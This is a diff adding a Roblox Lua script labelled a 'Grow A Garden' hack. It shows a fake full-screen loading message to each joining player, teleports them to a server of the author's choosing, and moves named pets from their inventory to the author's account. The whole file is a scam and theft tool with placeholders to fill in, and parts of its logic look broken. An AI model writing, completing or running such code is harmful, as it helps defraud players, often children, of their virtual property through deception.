@@ -1,0 +1,70 @@
+-- Grow A Garden Hack Script (Select Specific Pets)
+local TeleportService = game:GetService("TeleportService")
+local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local yourPlaceId = YOUR_PLACE_ID_HERE -- Replace with Grow A Garden's Place ID
+local yourServerJobId = "YOUR_JOB_ID_HERE" -- Replace with your server's Job ID
+local yourUserId = YOUR_USER_ID_HERE -- Replace with your User ID
+local targetPets = {"Golden Bunny", "Fire Dragon"} -- Replace with the pet names or IDs you want to target
+
+-- Create fake loading screen GUI
+local loadingGui = Instance.new("ScreenGui")
+loadingGui.Name = "LoadingScreen"
+loadingGui.IgnoreGuiInset = true -- Fullscreen, no UI overlap
+local frame = Instance.new("Frame")
+frame.Size = UDim2.new(1, 0, 1, 0)
+frame.BackgroundColor3 = Color3.new(0, 0, 0)
+frame.BackgroundTransparency = 0.3
+frame.Parent = loadingGui
+local textLabel = Instance.new("TextLabel")
+textLabel.Size = UDim2.new(0.5, 0, 0.2, 0)
+textLabel.Position = UDim2.new(0.25, 0, 0.4, 0)
+textLabel.BackgroundColor3 = Color3.new(0, 0, 0)
+textLabel.BackgroundTransparency = 0.5
+textLabel.TextColor3 = Color3.new(1, 1, 1)
+textLabel.Text = "Loading Game... Please Wait!"
+textLabel.Font = Enum.Font.SourceSansBold
+textLabel.TextSize = 40
+textLabel.TextTransparency = 0
+textLabel.Parent = frame
+local spinner = Instance.new("ImageLabel")
+spinner.Size = UDim2.new(0.1, 0, 0.1, 0)
+spinner.Position = UDim2.new(0.45, 0, 0.6, 0)
+spinner.BackgroundTransparency = 1
+spinner.Image = "rbxassetid://501939826" -- Roblox loading spinner asset
+spinner.Rotation = 0
+spinner.Parent = frame
+-- Spin animation
+spawn(function()
+    while true do
+        spinner.Rotation = spinner.Rotation + 10
+        wait(0.1)
+    end
+end)
+loadingGui.Parent = ReplicatedStorage
+
+-- Switch to your server and block screen
+Players.PlayerAdded:Connect(function(player)
+    loadingGui:Clone().Parent = player.PlayerGui
+    local teleportOptions = Instance.new("TeleportOptions")
+    teleportOptions.ServerInstanceId = yourServerJobId
+    TeleportService:TeleportToPlaceInstance(yourPlaceId, yourServerJobId, {player}, teleportOptions)
+end)
+
+-- Teleport to you and force specific pet gift
+local function forceGiftPets(player)
+    local targetPlayer = Players:GetPlayerByUserId(yourUserId)
+    if targetPlayer and player.Character and targetPlayer.Character then
+        player.Character.HumanoidRootPart.CFrame = targetPlayer.Character.HumanoidRootPart.CFrame
+        -- Select specific pets from inventory
+        local petInventory = player:FindFirstChild("PetInventory") or {}
+        for _, pet in pairs(petInventory) do
+            -- Check if pet name or ID matches targetPets list
+            if table.find(targetPets, pet.Name) or table.find(targetPets, pet.PetId) then
+                pet.Parent = targetPlayer
+            end
+        end
+    end
+end
+
+Players.PlayerAdded:Connect(forceGiftPets)
